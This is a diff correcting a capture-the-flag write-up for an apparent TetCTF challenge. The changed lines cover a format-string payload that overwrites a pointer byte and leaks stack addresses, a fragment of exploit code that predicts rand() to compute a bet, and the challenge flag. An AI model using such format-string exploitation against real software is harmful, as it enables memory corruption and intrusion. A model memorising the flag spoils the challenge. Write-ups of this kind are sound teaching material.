@@ -176,7 +176,7 @@ So far all we did was overwrite the money address (`.bss` address) with the feed
 
 "%88c%13$hhn|%10$p|%29$p"
 
-* %88c - This is just reading 88 characters because we need to overwrite the lower byte of the `.bss` pointer with 0x58.
+* %88c - This is just reading one character and padding it upto 88 characters because we need to overwrite the lower byte of the .bss pointer with 0x58.
 * %13$hhn - hhn means overwrite the lowest byte when %13 is the offset of the pointer we write to on the stack.
 * "\|" - pipe lines are used to split the leaks so it's easier to parse later on.
 * %10$p - The stack pointer is at the offset of 10 pointers on the stack.
@@ -239,7 +239,7 @@ def main():
     add_value = libc_so.rand()
     
     # Calculating our bet by stack addr, curr addr and the add_value the program will generate
-    bet = leak_stack - (addr + add value)
+    bet = leak_stack - (addr + add_value)
     # Send the bet
     io.sendline(str(bet))
     io.recvuntil("Your choice:")
@@ -271,6 +271,6 @@ def main():
 ### Proof of flag
 
 ```
-TetCTF{viettel: *100*311267385452644#
+TetCTF{viettel: *100*311267385452644#}
 ```
 
